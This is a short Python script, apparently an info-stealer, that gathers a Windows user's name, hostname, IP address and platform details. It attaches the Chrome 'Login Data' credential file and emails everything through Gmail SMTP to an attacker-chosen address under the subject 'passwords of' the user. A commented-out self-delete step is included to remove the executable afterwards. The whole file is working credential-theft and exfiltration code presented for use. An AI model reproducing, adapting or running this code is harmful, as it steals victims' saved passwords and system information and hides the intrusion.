import smtplib
import getpass
import platform
import socket
import os
import sys
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Al0nnso - 2019
# Disable the less secure apps in your account
# Remove the last comment to autodelete

# Set the credentials
email_user = 'EMAIL'
email_password = 'PASSWORD'
email_send = 'EMAIL_TO_SEND'

# Computer information
username = getpass.getuser()
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
inf="{}\n{}\n\n> System.inf\n{}\n{}\n{}\n\n> Raw:\n{}".format(hostname,IPAddr,platform.node(),platform.system(),platform.processor(),platform.uname())

# Configure email
subject = 'passwords of {}'.format(username)
msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = inf
msg.attach(MIMEText(body,'plain'))

# This file will be sended ( wil be encrypted :( )
filename='C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.txt'.format(username)
attachment  =open(filename,'rb')

# Set indexed file
part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

# Attach and login
msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)

# Send the email
server.sendmail(email_user,email_send,text)
server.quit()

# Autodelete function
file_path = os.path.abspath(__file__)
file=file_path.replace(".py",".exe")
file_path=file
#os.remove(file_path)